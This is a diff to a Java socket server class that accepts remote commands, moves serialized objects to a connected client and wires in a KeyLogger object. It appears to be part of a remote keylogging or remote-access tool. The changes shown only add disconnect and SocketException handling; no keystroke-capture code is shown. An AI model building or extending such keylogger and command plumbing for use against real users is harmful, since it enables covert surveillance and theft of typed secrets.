@@ -6,6 +6,7 @@ import java.io.ObjectOutputStream;
 import java.net.InetAddress;
 import java.net.ServerSocket;
 import java.net.Socket;
+import java.net.SocketException;
 import java.net.UnknownHostException;
 
 public class Server {
@@ -29,7 +30,7 @@ public class Server {
             Close();
         try {
             this.serverSocket = new ServerSocket(port);
-            this.keyLogger = new KeyLogger();
+            this.keyLogger = new KeyLogger(this);
         } catch (IOException e) {
             e.printStackTrace();
         }
@@ -61,6 +62,7 @@ public class Server {
                     this.clientSocket = this.serverSocket.accept();
                     this.dataOutputStream = new DataOutputStream(clientSocket.getOutputStream());
                     this.dataInputStream = new DataInputStream(clientSocket.getInputStream());
+                    continue;
                 }
                 String cmdString = ReceiveCommand();
                 if (cmdString.equalsIgnoreCase("ShutDown")) {
@@ -87,8 +89,11 @@ public class Server {
     }
 
     public boolean IsConnected() {
-        if (this.clientSocket == null)
+        if (this.clientSocket == null) {
+            this.dataInputStream = null;
+            this.dataOutputStream = null;
             return false;
+        }
         return this.clientSocket.isConnected();
     }
 
@@ -102,6 +107,8 @@ public class Server {
                 System.out.println(cmd);
                 return cmd;
             }
+        } catch (SocketException e) {
+            this.clientSocket = null;
         } catch (IOException e) {
             e.printStackTrace();
         }
@@ -116,6 +123,9 @@ public class Server {
             ObjectInputStream objectInputStream = new ObjectInputStream(dataInputStream);
             obj = objectInputStream.readObject();
             return obj;
+        } catch (SocketException e) {
+            this.clientSocket = null;
+            e.printStackTrace();
         } catch (IOException e) {
             e.printStackTrace();
         } catch (ClassNotFoundException e) {
@@ -132,6 +142,8 @@ public class Server {
             ObjectOutputStream objectOutputStream = new ObjectOutputStream(dataOutputStream);
             objectOutputStream.writeObject(obj);
             dataOutputStream.flush();
+        } catch (SocketException e) {
+            this.clientSocket = null;
         } catch (IOException e) {
             e.printStackTrace();
         }
@@ -141,8 +153,12 @@ public class Server {
         if (!IsConnected())
             return;
         try {
+            if (dataOutputStream == null)
+                return;
             dataOutputStream.writeUTF(cmd);
             dataOutputStream.flush();
+        } catch (SocketException e) {
+            this.clientSocket = null;
         } catch (IOException e) {
             e.printStackTrace();
         }
